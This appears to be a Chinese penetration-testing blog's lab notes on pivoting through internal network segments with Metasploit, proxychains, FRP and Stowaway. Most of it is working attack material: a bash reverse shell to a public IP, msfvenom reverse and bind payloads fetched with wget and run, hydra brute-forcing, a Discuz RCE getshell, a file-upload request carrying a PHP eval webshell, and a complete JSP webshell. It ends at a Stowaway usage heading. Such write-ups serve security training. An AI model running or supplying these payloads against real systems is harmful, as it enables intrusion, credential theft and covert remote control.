<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/124.223.217.243/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ul>
<li>msfvenom 生成linux后门</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse\_tcp lhost=124.223.217.243 lport=6666 -f elf -o re\_1818.elf</span><br></pre></td></tr></table></figure>



<ul>
<li>MSF开启监听</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p linux/x64/meterpreter/reverse\_tcp -H 124.223.217.243 -P 6666</span><br></pre></td></tr></table></figure>



<ul>
<li>远程下载执行上线MSF</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server wget -P /tmp &lt;http://124.223.217.243:8000/re_6666.elf&gt; chmod +x /tmp/re\_6666.elf ./re\_6666.elf sessions查看会话</span><br></pre></td></tr></table></figure>



<h2 id="渗透Target1"><a href="#渗透Target1" class="headerlink" title="渗透Target1"></a>渗透Target1</h2><ul>
<li>主机信息收集</li>
</ul>
<p>前面拿到了老师主机的shell，反弹回来的，然后拿到了meterpreter</p>
<p>ifconfig：发现存在 192.168.2.0&#x2F;24 的内网网段。inet模仿的就是机器公网ip，192.168.2.151模仿的就是我们拿到的内网ip，在2网段，据此我们继续收集信息，发起攻击</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210204872.png" alt="image-20220921020421699"></p>
<p>msf拿到的shell不好看，我们可以通过python美化一点，得到一个和本地执行一样更加真实的终端</p>
<p>python pty 模块得到 pty 终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -V 先查看是否有python</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>探测此网段存活主机：可以通过脚本，也可以通过fscan扫内网</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.sh</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254);<span class="keyword">do</span> ping -c 1 192.168.81.<span class="variable">$num</span>|grep <span class="string">&quot;ttl&quot;</span>|awk -F <span class="string">&quot;[ :]&quot;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -P /tmp http://124.71.45.28:8000/1.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要使用fscan可能要先上传fscan，wget获取，msf 有upload功能        </span><br><span class="line">./fscan -h 192.168.2.0/24</span><br><span class="line">fscan扫内网很方便，扫描的快</span><br><span class="line"></span><br><span class="line">(icmp) Target &#x27;192.168.2.151&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;192.168.2.1&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;192.168.2.242&#x27; is alive</span><br><span class="line">192.168.2.242:445 open</span><br><span class="line">192.168.2.242:139 open</span><br><span class="line">192.168.2.242:135 open</span><br><span class="line">192.168.2.242:21 open</span><br><span class="line">192.168.2.242:80 open</span><br><span class="line"></span><br><span class="line">192.168.2.242:3306 open</span><br><span class="line"></span><br><span class="line">192.168.2.242:10000 open</span><br><span class="line">start vulscan</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.2.242</span><br><span class="line">   [-&gt;]metinfo-xss</span><br><span class="line">   [-&gt;]192.168.2.242</span><br><span class="line">   [-&gt;]192.168.3.190</span><br><span class="line"></span><br><span class="line">[*] 192.168.2.242        __MSBROWSE__\METINFO-XSS       Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[+] 192.168.2.242       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[+] SSH:192.168.2.151:22:root root</span><br></pre></td></tr></table></figure>

<p>发现存活主机 192.168.2.242 ，并开放web服务，存在Discuz服务。</p>
<h2 id="渗透Target2"><a href="#渗透Target2" class="headerlink" title="渗透Target2"></a>渗透Target2</h2><h3 id="获得target1的shell后，添加到-192-168-2-网段的路由"><a href="#获得target1的shell后，添加到-192-168-2-网段的路由" class="headerlink" title="-获得target1的shell后，添加到 192.168.2 网段的路由"></a>-获得target1的shell后，添加到 192.168.2 网段的路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在目标target1上的meterpreter上执行</span><br><span class="line">run autoroute -s 192.168.2.0/24    添加到 192.168.2  网段的路由</span><br><span class="line">run autoroute -p    查看添加的路由</span><br></pre></td></tr></table></figure>

<h3 id="使用-MSF-的-socks5-模块建立-socks-代理服务（使用msf会很简单）"><a href="#使用-MSF-的-socks5-模块建立-socks-代理服务（使用msf会很简单）" class="headerlink" title="-使用 MSF 的 socks5 模块建立 socks 代理服务（使用msf会很简单）"></a>-使用 MSF 的 socks5 模块建立 socks 代理服务（使用msf会很简单）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search socks</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options    0.0.0.0表示任何人可上此代理，1080是连接socks代理的端口</span><br><span class="line">    SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be</span><br><span class="line">                                        an address on the local machine or 0.0.0.0 to listen on all add</span><br><span class="line">                                        resses.</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line"> </span><br><span class="line">exploit –j     后台执行</span><br><span class="line">jobs查看</span><br><span class="line"></span><br><span class="line">开启的socks代理流量，不管是本地的127.0.0.1还是外部我windows都可以走此通道</span><br><span class="line">msf搭建的就是一个socks代理服务器</span><br><span class="line">接下来通过proxychains验证socks代理是否有用</span><br><span class="line">我们可以通过netstat -anlp|grep 1080 查看1080端口状态 是否在监听</span><br></pre></td></tr></table></figure>

<h3 id="配置proxychains代理"><a href="#配置proxychains代理" class="headerlink" title="-配置proxychains代理"></a>-配置proxychains代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VPS</span><br><span class="line">apt install proxychains</span><br><span class="line">修改配置 使我们的数据走我们代理</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">注释掉socks4那一行，加上：</span><br><span class="line">socks5 127.0.0.1 1080</span><br><span class="line">proxychains就是让我们执行的操作，走我们配置的代理服务器也就是本地的1080端口</span><br></pre></td></tr></table></figure>

<h3 id="检验测试"><a href="#检验测试" class="headerlink" title="-检验测试"></a>-检验测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">之前对内网信息收集 发现了192.168.2.242开启了http服务，进行测试</span><br><span class="line">proxychains curl http://192.168.2.242</span><br><span class="line">root@VM-16-6-ubuntu:~/tools# proxychains curl http://192.168.2.242</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="代理namp扫描内网"><a href="#代理namp扫描内网" class="headerlink" title="-代理namp扫描内网"></a>-代理namp扫描内网</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自此就可以通过proxchains代理访问内网的192.168.2.242机器，对其</span><br><span class="line">proxychains nmap -sT -Pn -n -T4 192.168.2.242</span><br><span class="line">另外需要注意一定要使用-Pn，不能使用ping，因为我们的socks是会话层协议，不支持ICMP协议，不支持ping</span><br><span class="line">开放端口：21/80/135/139/445/3306/3389</span><br><span class="line">操作系统：windows</span><br><span class="line">Nmap scan report for 192.168.2.242</span><br><span class="line">Host is up (0.026s latency).</span><br><span class="line">Not shown: 986 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1025/tcp  open  NFS-or-IIS</span><br><span class="line">1026/tcp  open  LSA-or-nterm</span><br><span class="line">1027/tcp  open  IIS</span><br><span class="line">1031/tcp  open  iad2</span><br><span class="line">1047/tcp  open  neod1</span><br><span class="line">1049/tcp  open  td-postman</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="分析利用"><a href="#分析利用" class="headerlink" title="-分析利用"></a>-分析利用</h3><p>21 &#x2F; 3306 端口：弱口令爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains hydra -vV -l root -P /usr/share/wordlists/metasploit/password.lst 192.168.2.242 ftp</span><br><span class="line">proxychains hydra -vV -l root -P /usr/share/wordlists/metasploit/password.lst 192.168.2.242 mysql</span><br></pre></td></tr></table></figure>

<p>80端口：discuz（cnvd-2019-22239）</p>
<blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/theLSA/discuz-ml-rce">https://github.com/theLSA/discuz-ml-rce</a>使用脚本快速getshell</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将脚本下载到本地</span><br><span class="line">pip install -r requirements.txt安装依赖</span><br><span class="line">proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php        检测是否可利用</span><br><span class="line">proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php --getshell        在网站根目录写入x.php</span><br><span class="line"></span><br><span class="line">执行结果</span><br><span class="line">root@VM-16-6-ubuntu:~/tools/discuz-ml-rce# proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">target is vulnerable!!!</span><br><span class="line">root@VM-16-6-ubuntu:~/tools/discuz-ml-rce# proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php --getshell</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Getshell success!-shellPath:http://192.168.2.242/x.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="配置socks代理连接shell"><a href="#配置socks代理连接shell" class="headerlink" title="-配置socks代理连接shell"></a>-配置socks代理连接shell</h3><p>先配置socks代理，再连内网，记得保存生效</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210207597.png" alt="image-20220921020747432"></p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210207044.png" alt="image-20220921020755811"></p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210208307.png" alt="image-20220921020804093"></p>
<h2 id="渗透Target3"><a href="#渗透Target3" class="headerlink" title="渗透Target3"></a>渗透Target3</h2><p>我们如果需要拿到target3的shell需要先建立前往target3的路由，需要先拿到target2的meterpreter，当数据包到了之后，通过路由得知target 192.168.3.0网段的数据包要往target2的meterpreter session转发！</p>
<h3 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="-探测存活主机"></a>-探测存活主机</h3><p>ipconfig：发现存在 192.168.3.0&#x2F;24 的内网网段。</p>
<p>探测此网段存活主机：发现存活主机 192.168.3.180</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.3.0/24 &gt; 123.txt</span><br><span class="line"><span class="built_in">type</span> 123.txt</span><br><span class="line">+] 192.168.3.190    MS17-010    (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8983 code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8888 code:302 len:219    title:Redirecting...</span><br><span class="line">[*] WebTitle:http://192.168.3.180:888  code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://192.168.3.180      code:302 len:0      title:None</span><br><span class="line">[*] 192.168.3.190        __MSBROWSE__\METINFO-XSS       Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8983/solr/ code:200 len:14470  title:Solr Admin</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8888/login code:200 len:24     title:安全入口校验失败</span><br><span class="line">[*] WebTitle:http://192.168.3.180/seller.php?s=/Public/login code:200 len:27     title:登录 - 商家管理系统</span><br><span class="line">[+] InfoScan:http://192.168.3.180:8888/login [宝塔-BT.cn] </span><br><span class="line">[*] WebTitle:http://192.168.3.190      code:200 len:23     title:-  Powered by Discuz!</span><br><span class="line">[+] http://192.168.3.180:8983 poc-yaml-solr-cve-2019-0193</span><br><span class="line">[+] http://192.168.3.190 poc-yaml-discuz-ml3x-cnvd-2019-22239</span><br><span class="line">[+] http://192.168.3.190 poc-yaml-phpstudy-backdoor-rce</span><br><span class="line">[+] SSH:192.168.3.180:22:root root</span><br></pre></td></tr></table></figure>

<h3 id="获取Target2的shell"><a href="#获取Target2的shell" class="headerlink" title="-获取Target2的shell"></a>-获取Target2的shell</h3><p>现在有两种思路拿到在内网种target2的shell，</p>
<p>其一是层层设置代理转发流量出网，最终到我们的VPS；其二便是接下来msf直接获取的方法</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210208921.png" alt="image-20220921020857687"></p>
<p>注意这个地方不能直接反弹shell，内网的target2并不能访问公网，所以不能通过reverse_tcp建立连接，不能反弹shell，反向的shell连接不到主机！</p>
<p>所以我们要使用正向shell 还需要注意的是，我们公网VPS通过代理可以访问内网target2，但是呢target2并不可以出网！！！</p>
<ul>
<li>msfvenom 生成正向连接 payload</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind\_tcp lport=7878 -f exe -o bind7878.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>上传到 target2 并执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start bind7878.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>MSF添加正向连接监听器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter/bind\_tcp -H 192.168.2.242 -P 7878</span><br></pre></td></tr></table></figure>

<p>反弹回 target2 的 meterpreter shell</p>
<h3 id="添加到33网段的路由"><a href="#添加到33网段的路由" class="headerlink" title="-添加到33网段的路由"></a>-添加到33网段的路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -s 192.168.3.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">这样子才会将数据转发到target2的meterpreter </span><br></pre></td></tr></table></figure>

<h3 id="代理nmap扫描Target3"><a href="#代理nmap扫描Target3" class="headerlink" title="-代理nmap扫描Target3"></a>-代理nmap扫描Target3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxychains nmap –sT –Pn –n –T4 192.168.3.180</span><br><span class="line">开放端口：21/22/80/135/139/445/8888</span><br><span class="line">操作系统：linux</span><br></pre></td></tr></table></figure>

<p>80端口：狮子鱼cms</p>
<h3 id="狮子鱼cms任意文件上传拿shell"><a href="#狮子鱼cms任意文件上传拿shell" class="headerlink" title="-狮子鱼cms任意文件上传拿shell"></a>-狮子鱼cms任意文件上传拿shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp</span><br><span class="line"></span><br><span class="line">POST </span><br><span class="line">/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host: 192.168.3.180</span><br><span class="line">Content-Type: multipart/form-data; boundary=----</span><br><span class="line">WebKitFormBoundary8UaANmWAgM4BqBSs</span><br><span class="line">Content-Length: 204</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Connection: close</span><br><span class="line">------WebKitFormBoundary8UaANmWAgM4BqBSs</span><br><span class="line">Content-Disposition: form-data; name=&quot;files&quot;; </span><br><span class="line">filename=&quot;mm.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">&lt;?php eval($_POST[&#x27;pwd&#x27;]);?&gt;</span><br><span class="line">------WebKitFormBoundary8UaANmWAgM4BqBSs</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210210599.png" alt="image-20220921021014377"></p>
<blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://192.168.3.180/Common/image/uploads/1652168710238.php">http://192.168.3.180/Common/image/uploads/1652168710238.php</a></p>
</blockquote>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210235766.png" alt="image-20220921021039518"></p>
<h1 id="Socks代理实战二-FRP"><a href="#Socks代理实战二-FRP" class="headerlink" title="Socks代理实战二(FRP)"></a>Socks代理实战二(FRP)</h1><p>代理工具 搭建较好用的代理通道</p>
<blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://gofrp.org/docs/examples/vhost-http/">https://gofrp.org/docs/examples/vhost-http/</a>文档</p>
</blockquote>
<h2 id="渗透Target1-1"><a href="#渗透Target1-1" class="headerlink" title="渗透Target1"></a>渗透Target1</h2><p>我们已经通过shiro拿到shiro的shell，我们进一步拿到反弹shell，拿到一个可执行命令的shell</p>
<h3 id="拿反弹shell方法一：远程下载-webshell（冰蝎的）到网站目录"><a href="#拿反弹shell方法一：远程下载-webshell（冰蝎的）到网站目录" class="headerlink" title="-拿反弹shell方法一：远程下载 webshell（冰蝎的）到网站目录"></a>-拿反弹shell方法一：远程下载 webshell（冰蝎的）到网站目录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br><span class="line">cd /usr/tomcat/apache-tomcat-8.5.0/webapps/sh</span><br><span class="line">wget http://124.223.217.243:8000/9999.jsp</span><br></pre></td></tr></table></figure>

<p>冰蝎：</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236736.png" alt="image-20220921023618509"></p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236830.png" alt="image-20220921023622619"></p>
<p>蚁剑shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) </span><br><span class="line">decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>2.内存 shell</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fupinglee/ShiroScan/releases">https://github.com/fupinglee/ShiroScan/releases</a></p>
</blockquote>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236936.png" alt="image-20220921023649681"></p>
<p>注入内存马 ，注入之后即可连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://218.76.8.99:38080/sh/xxx?ver=aaaaaa</span><br><span class="line">pwd：2zhl</span><br><span class="line">连接类型：CUSTOM（自定义类型）</span><br><span class="line">请求信息：（header）注意要带上请求头</span><br><span class="line">Accept-Header</span><br><span class="line">thisIsMyJob!@</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210237704.png" alt="image-20220921023717454"></p>
<p>正常连接并执行命令：</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210238087.png" alt="image-20220921023748386"></p>
<h2 id="FRP建立Socks代理"><a href="#FRP建立Socks代理" class="headerlink" title="FRP建立Socks代理"></a>FRP建立Socks代理</h2><ul>
<li>1.VPS：124.233.217.243</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line"></span><br><span class="line">              ./frps   s表示服务端</span><br><span class="line">                                    ./frpc   c表示客户端</span><br><span class="line">                                    -c       指定配置文件</span><br><span class="line">默认frps启动在7000端口，如果要修改启动端口就-c指定配置文件</span><br><span class="line">先要修改配置</span><br><span class="line">cat frps_vps.ini</span><br><span class="line">[common]                 =====&gt;[]内的是注释内容 不会生效</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>



<ul>
<li>2.target1：192.168.2.151</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc –c frpc_1.ini</span><br><span class="line"> ps -elf |grep frpc查看进程是否启动</span><br><span class="line"> 命令执行完成后，会和我们服务端建立连接</span><br><span class="line"> 并生成socks5代理在10088端口</span><br><span class="line">写入配置文件</span><br><span class="line"></span><br><span class="line">cat frpc_1.ini </span><br><span class="line">[common]           </span><br><span class="line">server_addr = 124.223.217.243</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]        搭建了一个socks5的代理</span><br><span class="line">type = tcp        流量类型是tcp，如果要代理http改为http即可                </span><br><span class="line">plugin = socks5            ，如果要启用socks5代理，就要使用此socks5的插件</span><br><span class="line">remote_port = 10088        即socks代理开启在哪个端口，并注意在sockschains上也要修改对应端口</span><br></pre></td></tr></table></figure>



<ul>
<li>2.验证socks代理</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在使用proxychins连接我们的socks代理之前需要先去配置端口</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line">#socks4         127.0.0.1 9050</span><br><span class="line">#socks5         127.0.0.1 1080</span><br><span class="line">socks5          127.0.0.1 10088</span><br><span class="line"></span><br><span class="line">proxychains4 nmap -sT -Pn -T4 -n 192.168.2.242</span><br></pre></td></tr></table></figure>



<h2 id="FRP建立二层Socks代理"><a href="#FRP建立二层Socks代理" class="headerlink" title="FRP建立二层Socks代理"></a>FRP建立二层Socks代理</h2><p>先要拿下target2的shell，蚁剑</p>
<p>再搭建二层代理将我们target2的请求转发给target3</p>
<ul>
<li>1.VPS：124.223.217.243</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>



<ul>
<li>2.Target1：192.168.2.151</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先杀掉原先的进程</span><br><span class="line">ps -elf |grep frpc</span><br><span class="line">kill id</span><br><span class="line">在target1，要重新启动一个frp，指定新的配置文件如下！</span><br><span class="line">./frpc -c frpc_11.ini</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 124.223.217.243</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5_to_2]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10088</span><br><span class="line">plugin = socks5</span><br><span class="line">[socks5_to_3]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 10089</span><br><span class="line">remote_port = 10090</span><br><span class="line"></span><br><span class="line">以上的配置会在服务端启动两个代理服务器，一个在10088端口 一个在10090</span><br><span class="line">在proxychains上，联系target2走10088，联系target3走10090</span><br><span class="line">[socks5_to_2]是到二网段的一个配置，负责沟通VPS与本机target2的联系，与上面的配置实际上是一样的</span><br><span class="line">[socks5_to_3]是到三网段</span><br><span class="line">[socks5_to_3]做的就是一个端口转发的配置</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1            本地</span><br><span class="line">local_port = 10089             告诉我们本地有一个监听端口10089  </span><br><span class="line">remote_port = 10090            告诉我们的VPS要监听一个10090端口</span><br><span class="line">这个地方做的一个事情就是端口转发的事情，将本地10089端口的内容转发到公网10090端口</span><br><span class="line">意思就是我们在公网访问vps的10090就相当于访问内网的10089端口！！！</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再开启一个server端，供client端连接，建立socks代理连接</span><br><span class="line">./frps -c frps_1.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>



<ul>
<li>3.Target2：192.168.3.190</li>
</ul>
<p>先上传我们的工具frp_win</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_2.ini</span><br><span class="line">tasklist | findstr frpc验证进程</span><br><span class="line">taskkill /pid pid /f强制杀掉一个已存在的进程</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.151</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5_2]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 10089</span><br></pre></td></tr></table></figure>

<p>4.验证socks代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -T4 -n 192.168.3.180</span><br></pre></td></tr></table></figure>

<h1 id="Socks代理实战三-Stowaway"><a href="#Socks代理实战三-Stowaway" class="headerlink" title="Socks代理实战三(Stowaway)"></a>Socks代理实战三(Stowaway)</h1><p>适合多层的网络环境，frp简单一点的还可以，复杂了就不太稳定</p>
<p>frp文件比较大，通过层层代理传输进动静会比较大，对网络的要求也比较高</p>
<p>stowaway树状连接节点会方便很多</p>
<h2 id="Stowaway简介"><a href="#Stowaway简介" class="headerlink" title="Stowaway简介"></a>Stowaway简介</h2><blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p>
</blockquote>
<p>Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具</p>
<p>用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能</p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul>
<li>节点: 指 admin || agent</li>
<li>主动模式: 指当前操作的节点主动连接另一个节点</li>
<li>被动模式: 指当前操作的节点监听某个端口，等待另一个节点连接</li>
<li>上游: 指当前操作的节点与其父节点之间的流量</li>
<li>下游：指当前操作的节点与其所有子节点之间的流量</li>
</ul>
<h2 id="Stowaway使用说明"><a href="#Stowaway使用说明" class="headerlink" title="Stowaway使用说明"></a>Stowaway使用说明</h2><p>Stowaway分为两个角色,分别是：</p>
<ul>
<li>admin 渗透测试者使用的主控端</li>
<li>agent 渗透测试者部署的被控端</li>
</ul>
<h3 id="admin"><a href="#admin" class="headerlink" title="-admin"></a>-admin</h3><ul>
<li>admin 用法：</li>
</ul>
